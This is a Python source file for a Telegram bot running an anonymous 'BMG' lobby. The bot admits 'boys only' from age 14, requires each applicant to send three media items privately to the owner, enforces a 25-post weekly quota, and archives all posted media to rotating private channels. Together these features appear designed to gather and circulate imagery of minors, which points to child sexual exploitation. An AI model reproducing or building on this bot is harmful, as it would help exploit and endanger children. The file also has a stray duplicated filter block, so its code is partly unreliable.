import asyncio

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery
)

import os

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = 8755001668

MAX_USERS = 1000

CHANNELS = [
    -1003759990321,
    -1003947622092,
    -1003839014211,
    -1003877842234
]

current_channel = 0
channel_counter = 0

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

users = {}
pending_users = {}
banned_users = {}
user_stats = {}

waiting_name = set()


# ================= ARCHIVE =================

async def send_to_archive(file_type, file_id, caption=None):

    global current_channel
    global channel_counter

    channel_id = CHANNELS[current_channel]

    try:

        if file_type == "photo":

            await bot.send_photo(
                channel_id,
                file_id,
                caption=caption
            )

        elif file_type == "video":

            await bot.send_video(
                channel_id,
                file_id,
                caption=caption
            )

        elif file_type == "document":

            await bot.send_document(
                channel_id,
                file_id,
                caption=caption
            )

        channel_counter += 1

        if channel_counter >= 100:

            channel_counter = 0

            current_channel += 1

            if current_channel >= len(CHANNELS):

                current_channel = 0

    except Exception as e:

        print(e)


# ================= START =================

@dp.message(F.text == "/start")
async def start(message: Message):

    user_id = message.from_user.id

    # banned
    if user_id in banned_users:

        await message.answer(
            f"⛔ You are banned\nReason: {banned_users[user_id]}"
        )

        return

    # pending
    if user_id in pending_users:

        await message.answer(
            """⏳ Awaiting Approval

Your submission is still pending admin review.
You'll be notified once they approve or reject your submission."""
        )

        return

    # approved
    if user_id in users:

        await message.answer(
            "✅ You are already approved."
        )

        return

    waiting_name.add(user_id)

    rules_text = """
📜 Lobby Rules

⭐ ⭐️ 🚨 OMG NEW HUMAN 🚨
- just spawned in BMG!!

PLEASE ENSURE ALL SUBMISSIONS ARE 14+

Say hi or we assume you’re a potato 🥔

━━━━━━━━━━━━━━

1A - Strictly OVER 14 and BOYS only

1B - IF U dont post minimum 25 times in 7 days
you will be kicked automatically by the bot.

━━━━━━━━━━━━━━

📷 Media Rules

• No illegal content
• No spam
• No fake media
• No girl content

━━━━━━━━━━━━━━

⚠️ Admin powers

Mods can:
• mute
• warn
• kick
• ban
"""

    welcome_text = """
🎭 Welcome to BMG 2026!

This is an anonymous lobby.

1️⃣ Choose alias
2️⃣ Send 3 media
3️⃣ Wait approval

Send your alias now:
"""

    await message.answer(rules_text)
    await message.answer(welcome_text)


# ================= RECEIVE =================

@dp.message(~F.text.startswith("/"))
async def all_messages(message: Message):

    user_id = message.from_user.id
    # ================= DELETE LINKS =================

    if message.text:

        # allow owner
        if message.from_user.id != OWNER_ID:

            text = message.text.lower()

            links = [
                "http",
                "https",
                "t.me",
                "telegram.me",
                ".com",
                ".net",
                ".org",
                "www."
            ]

            for link in links:

                if link in text:

                    try:
                        await message.delete()
                    except:
                        pass

                    await message.answer(
                        "🚫 Links are not allowed."
                    )

                    return
    # banned
    if user_id in banned_users:

        await message.answer(
            f"⛔ You are banned\nReason: {banned_users[user_id]}"
        )

        return

    # ================= SAVE ALIAS =================

    if user_id in waiting_name:

        nickname = message.text

        pending_users[user_id] = {
            "alias": nickname,
            "media": 0
        }

        waiting_name.remove(user_id)

        await message.answer(
            f"""✅ Alias Set!

Your alias: 🔰 {nickname}

📸 Send 3 media items."""
        )

        return

    # ================= APPROVAL MEDIA =================

    if user_id in pending_users:

        if not (
            message.photo or
            message.video or
            message.document
        ):
            return

        try:
            await message.delete()
        except:
            pass

        pending_users[user_id]["media"] += 1

        count = pending_users[user_id]["media"]

        nickname = pending_users[user_id]["alias"]

        caption = (
            f"📥 New Submission\n\n"
            f"👤 Alias: {nickname}\n"
            f"🆔 ID: {user_id}\n"
            f"📸 Progress: {count}/3"
        )

        # photo
        if message.photo:

            await bot.send_photo(
                OWNER_ID,
                message.photo[-1].file_id,
                caption=caption
            )

        # video
        elif message.video:

            await bot.send_video(
                OWNER_ID,
                message.video.file_id,
                caption=caption
            )

        # document
        elif message.document:

            await bot.send_document(
                OWNER_ID,
                message.document.file_id,
                caption=caption
            )

        await message.answer(
            f"📸 Submission Progress: {count}/3"
        )

        # finish
        if count >= 3:

            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="✅ Accept",
                            callback_data=f"accept_{user_id}"
                        ),

                        InlineKeyboardButton(
                            text="❌ Reject",
                            callback_data=f"reject_{user_id}"
                        )
                    ]
                ]
            )

            await bot.send_message(
                OWNER_ID,
                f"📥 Approval Request\n\n"
                f"👤 Alias: {nickname}\n"
                f"🆔 ID: {user_id}",
                reply_markup=keyboard
            )

            await message.answer(
                """⏳ Awaiting Approval

Your submission is still pending admin review."""
            )

        return

    # ================= NOT APPROVED =================

    if user_id not in users:

        await message.answer(
            "⏳ You are not approved yet."
        )

        return

    # ================= DELETE ORIGINAL =================

    try:
        await message.delete()
    except:
        pass

    nickname = users[user_id]
    
     # ================= RELAY =================

    for uid in users:

        try:

            # ================= TEXT =================

            if message.text:

                if user_id in user_stats:

                    user_stats[user_id]["messages"] += 1

                await bot.send_message(
                    uid,
                    f"👤 {nickname}\n\n📩 {message.text}"
                )

            # ================= PHOTO =================

            elif message.photo:

                if user_id in user_stats:

                    user_stats[user_id]["photos"] += 1

                await send_to_archive(
                    "photo",
                    message.photo[-1].file_id,
                    f"👤 {nickname}"
                )

                await bot.send_photo(
                    uid,
                    message.photo[-1].file_id,
                    caption=f"👤 {nickname}"
                )

            # ================= VIDEO =================

            elif message.video:

                if user_id in user_stats:

                    user_stats[user_id]["videos"] += 1

                await send_to_archive(
                    "video",
                    message.video.file_id,
                    f"👤 {nickname}"
                )

                await bot.send_video(
                    uid,
                    message.video.file_id,
                    caption=f"👤 {nickname}"
                )

            # ================= DOCUMENT =================

            elif message.document:

                if user_id in user_stats:

                    user_stats[user_id]["documents"] += 1

                await send_to_archive(
                    "document",
                    message.document.file_id,
                    f"👤 {nickname}"
                )

                await bot.send_document(
                    uid,
                    message.document.file_id,
                    caption=f"👤 {nickname}"
                )

        except:
            pass

# ================= ACCEPT / REJECT =================

@dp.callback_query()
async def callbacks(call: CallbackQuery):

    if call.from_user.id != OWNER_ID:
        return

    data = call.data

    # accept
    if data.startswith("accept_"):

        user_id = int(data.split("_")[1])

        nickname = pending_users[user_id]["alias"]

        if len(users) >= MAX_USERS:

            await bot.send_message(
                user_id,
                "⛔ Lobby is full."
            )

            return

        users[user_id] = nickname
        user_stats[user_id] = {
    "messages": 0,
    "photos": 0,
    "videos": 0,
    "documents": 0,
    "warns": 0
}

        del pending_users[user_id]

        await bot.send_message(
            user_id,
            "✅ Your request has been approved."
        )

        await call.message.edit_text(
            f"✅ Accepted {nickname}"
        )

    # reject
    elif data.startswith("reject_"):

        user_id = int(data.split("_")[1])

        nickname = pending_users[user_id]["alias"]

        del pending_users[user_id]

        await bot.send_message(
            user_id,
            "❌ Your request has been rejected."
        )

        await call.message.edit_text(
            f"❌ Rejected {nickname}"
        )


# ================= BAN =================

@dp.message(F.text.startswith("/ban"))
async def ban_user(message: Message):

    if message.from_user.id != OWNER_ID:
        return

    try:

        text = message.text.split()

        user_id = int(text[1])

        reason = " ".join(text[2:])

        banned_users[user_id] = reason

        if user_id in users:
            del users[user_id]

        await message.answer(
            "✅ User banned."
        )

        await bot.send_message(
            user_id,
            f"⛔ You are banned\nReason: {reason}"
        )

    except:

        await message.answer(
            "Usage:\n/ban id reason"
        )


# ================= KICK =================

@dp.message(F.text.startswith("/kick"))
async def kick(message: Message):

    if message.from_user.id != OWNER_ID:
        return

    try:

        user_id = int(message.text.split()[1])

        if user_id in users:

            del users[user_id]

            await bot.send_message(
                user_id,
                "❌ You have been kicked."
            )

            await message.answer(
                "✅ User kicked."
            )

    except:

        await message.answer(
            "Usage:\n/kick id"
        )


# ================= MEMBERS =================

@dp.message(F.text == "/members")
async def members(message: Message):

    if message.from_user.id != OWNER_ID:
        return

    await message.answer(
        f"👥 Members: {len(users)}"
    )

    # ================= DELETE LINKS =================

    if message.text:

        # allow owner
        if message.from_user.id != OWNER_ID:

            text = message.text.lower()

            links = [
                "http",
                "https",
                "t.me",
                "telegram.me",
                ".com",
                ".net",
                ".org",
                "www."
            ]

            for link in links:

                if link in text:

                    try:
                        await message.delete()
                    except:
                        pass

                    await message.answer(
                        "🚫 Links are not allowed."
                    )

                    return
        # ================= PANEL =================

@dp.message(F.text == "/panel")
async def panel(message: Message):

    if message.from_user.id != OWNER_ID:
        return

    if not users:

        await message.answer(
            "❌ No members."
        )

        return

    text = "👥 MEMBERS PANEL\n\n"

    for uid, nickname in users.items():

        stats = user_stats.get(uid, {})

        photos = stats.get("photos", 0)
        videos = stats.get("videos", 0)
        documents = stats.get("documents", 0)
        messages = stats.get("messages", 0)
        warns = stats.get("warns", 0)

        total_media = photos + videos + documents

        status = "🔴"

        if total_media > 0:
            status = "🟢"

        text += (
            f"{status} {nickname}\n"
            f"🆔 {uid}\n"
            f"📩 {messages}\n"
            f"🖼 {photos}\n"
            f"🎥 {videos}\n"
            f"📄 {documents}\n"
            f"⚠️ {warns}\n\n"
        )

    await message.answer(text)
# ================= MAIN =================

async def main():

    print("✅ BMG BOT STARTED")

    await dp.start_polling(bot)

asyncio.run(main())